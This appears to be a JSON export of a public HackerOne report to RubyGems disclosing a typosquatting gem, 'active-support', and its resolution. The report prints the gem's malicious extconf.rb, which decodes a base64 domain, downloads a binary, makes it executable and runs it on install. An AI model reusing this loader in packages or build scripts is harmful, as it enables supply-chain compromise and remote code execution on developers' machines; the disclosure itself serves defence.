{"id":392311,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTIzMTE=","url":"https://hackerone.com/reports/392311","title":"Malware in `active-support` gem","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-08-09T09:02:38.599Z","submitted_at":"2018-08-09T09:02:38.599Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"reed","url":"/reed","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby communityâ€™s gem hosting service."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-3779"],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-09T18:14:31.969Z","bug_reporter_agreed_on_going_public_at":"2018-08-09T17:54:58.994Z","team_member_agreed_on_going_public_at":"2018-08-09T18:14:31.879Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This was sent to RubySec:\n\nThe gem duplicates official `activesupport` (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (`29faea63.planfhntage.de`), downloads a payload, and executes.\n\nactive-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb\n\n```\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\n\nclass Smectis\n  def self.install_explot(weighership)\n    if !weighership.nil? and weighership != '0.0.0.0'\n      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))\n      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|\n        uterometer.binmode\n        uterometer.write(educable.body)\n        uterometer.chmod(0777)\n        uterometer.close\n      end\n      system('/tmp/autosymbiontic')\n    end\n  end\n\n  def self.run()\n    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n  end\nend\n\nSmectis.run()\n```\n\n## Impact\n\nRun arbitrary code on a victim's machine.","vulnerability_information_html":"\u003cp\u003eThis was sent to RubySec:\u003c/p\u003e\n\n\u003cp\u003eThe gem duplicates official \u003ccode\u003eactivesupport\u003c/code\u003e (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (\u003ccode\u003e29faea63.planfhntage.de\u003c/code\u003e), downloads a payload, and executes.\u003c/p\u003e\n\n\u003cp\u003eactive-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003erequire \u0026#39;net/http\u0026#39;\nrequire \u0026#39;uri\u0026#39;\nrequire \u0026#39;base64\u0026#39;\nrequire \u0026#39;resolv\u0026#39;\n\nclass Smectis\n  def self.install_explot(weighership)\n    if !weighership.nil? and weighership != \u0026#39;0.0.0.0\u0026#39;\n      educable = Net::HTTP.get_response(URI(\u0026#39;http://\u0026#39; + weighership + \u0026#39;/mimming\u0026#39;))\n      File.open(\u0026#39;/tmp/autosymbiontic\u0026#39;, \u0026#39;wb+\u0026#39;) do |uterometer|\n        uterometer.binmode\n        uterometer.write(educable.body)\n        uterometer.chmod(0777)\n        uterometer.close\n      end\n      system(\u0026#39;/tmp/autosymbiontic\u0026#39;)\n    end\n  end\n\n  def self.run()\n    milligram = \u0026#39;MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU=\u0026#39;\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n  end\nend\n\nSmectis.run()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRun arbitrary code on a victim\u0026#39;s machine.\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":330419,"file_name":"active-support-5.2.0.gem","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/330/419/b8bb51497c7be9e9eff3f0b3651ab72c9384dc56/active-support-5.2.0.gem?response-content-disposition=attachment%3B%20filename%3D%22active-support-5.2.0.gem%22%3B%20filename%2A%3DUTF-8%27%27active-support-5.2.0.gem\u0026response-content-type=application%2Fx-tar\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054948Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=197191e168a63ee8b9035f4056cbad7e594f13d2de565a53240a943c1e5d5e1a","file_size":381952,"type":"application/x-tar"},{"id":330420,"file_name":"extconf.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/330/420/4ccc7ef75fa262781b61b920beceb97abc7e4177/extconf.rb?response-content-disposition=attachment%3B%20filename%3D%22extconf.rb%22%3B%20filename%2A%3DUTF-8%27%27extconf.rb\u0026response-content-type=text%2Fx-c%2B%2B\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054948Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=2047a3f6b12fedc703f5763d340976eceac1bf72b0188e8265f71ca5c9c421ef","file_size":774,"type":"text/x-c++"}],"allow_singular_disclosure_at":"2018-09-08T17:54:59.100Z","allow_singular_disclosure_after":-72791689.56868719,"singular_disclosure_allowed":true,"vote_count":8,"voters":["kapytein","mashoud1122","sameerphad72","reed","mygf","japz","sa1tama0","cryptographer"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2042,"asset_type":"URL","asset_identifier":"rubygems.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3166955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","markdown_message":"\u003cp\u003eThanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-08-09T09:02:39.081Z","updated_at":"2018-08-09T09:02:39.081Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3167436,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @reed, ack. Working on this now.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e, ack. Working on this now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-09T13:01:59.028Z","updated_at":"2018-08-09T13:01:59.028Z","actor":{"username":"dwradcliffe","cleared":false,"url":"/dwradcliffe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/355/821154e381fe27d2273bc54a18049a3a87e1591d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3167461,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have removed the malicious gem and taken steps to prevent further malicious actions.","markdown_message":"\u003cp\u003eWe have removed the malicious gem and taken steps to prevent further malicious actions.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-09T13:12:13.727Z","updated_at":"2018-08-09T13:12:13.727Z","actor":{"username":"dwradcliffe","cleared":false,"url":"/dwradcliffe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/355/821154e381fe27d2273bc54a18049a3a87e1591d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"reed","url":"/reed"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3167462,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-09T13:12:23.315Z","updated_at":"2018-08-09T13:12:23.315Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3168177,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Blacklisted in https://github.com/rubygems/rubygems.org/pull/1762\n\nRequesting disclosure.","markdown_message":"\u003cp\u003eBlacklisted in \u003ca title=\"https://github.com/rubygems/rubygems.org/pull/1762\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems.org%2Fpull%2F1762\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rubygems/rubygems.org/pull/1762\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRequesting disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-09T17:54:59.032Z","updated_at":"2018-08-09T17:55:21.240Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3168251,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-09T18:14:31.914Z","updated_at":"2018-08-09T18:14:31.914Z","actor":{"username":"dwradcliffe","cleared":false,"url":"/dwradcliffe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/355/821154e381fe27d2273bc54a18049a3a87e1591d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3168252,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-09T18:14:32.004Z","updated_at":"2018-08-09T18:14:32.004Z","actor":{"username":"dwradcliffe","cleared":false,"url":"/dwradcliffe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/355/821154e381fe27d2273bc54a18049a3a87e1591d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}